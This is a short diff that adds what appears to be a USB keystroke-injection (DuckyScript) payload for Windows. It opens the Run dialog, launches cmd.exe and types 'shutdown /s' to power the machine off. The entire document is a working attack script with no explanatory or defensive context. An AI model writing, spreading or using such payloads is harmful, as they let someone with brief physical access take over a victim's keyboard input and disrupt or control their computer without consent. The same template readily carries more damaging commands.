@@ -1,0 +1,7 @@
+GUI r
+STRING cmd.exe
+DELAY 500
+RETURN
+DELAY 1000
+STRING shutdown /s
+RETURN
